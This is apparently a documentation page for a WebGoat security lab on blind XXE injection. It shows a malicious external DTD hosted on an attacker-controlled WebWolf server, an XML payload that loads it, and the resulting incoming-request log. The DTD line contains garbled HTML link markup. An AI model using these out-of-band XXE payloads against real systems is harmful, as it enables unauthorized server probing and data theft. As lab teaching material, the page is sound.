---
title: "A5:2021 | Security Misconfiguration (10) | Cycubix Docs"
layout: default
nav_order: 10
parent: "A5:2021 | Security Misconfiguration | Cycubix Docs"
grand_parent: "WebGoat Labs | Web Application Security Essentials | Cycubix Docs"
---
# A5:2021 | Security Misconfiguration (10) | Cycubix Docs

### Blind XXE <a href="#blind_xxe" id="blind_xxe"></a>

In some cases you will see no output because although your attack might have worked the field is not reflected in the output of page. Or the resource you are trying to read contains illegal XML character which causes the parser to fail. Let’s start with an example, in this case we reference an external DTD which we control on our own server.

As an attacker you have WebWolf under your control (**this can be any server under your control.**), you can for example use this server to ping it using [`http://127.0.0.1:9090/WebWolf/home`](http://127.0.0.1:9090/WebWolf/home)

How do we use this endpoint to verify whether we can perform XXE?

We can again use WebWolf to host a file called `attack.dtd`, create this file with the following contents:

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY ping SYSTEM '<a href="http://127.0.0.1:9090/WebWolf/landing" target="_blank" rel="noopener"><a href="http://127.0.0.1:9090/WebWolf/landing" class="bare">http://127.0.0.1:9090/WebWolf/landing</a></a>'>
```

Now submit the form change the xml using to:

```
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "webWolfLink:[webWolfLink]">
%remote;
]>
<comment>
  <text>test&ping;</text>
</comment>
```

Now in WebWolf browse to 'Incoming requests' and you will see:

```
{
  "method" : "GET",
  "path" : "/landing",
  "headers" : {
    "request" : {
      "user-agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
    },
  },
  "parameters" : {
    "test" : [ "HelloWorld" ],
  },
  "timeTaken" : "1"
}
```

So with the XXE we are able to ping our own server which means XXE injection is possible. So with the XXE injection we are basically able to reach the same effect as we did in the beginning with the curl command.
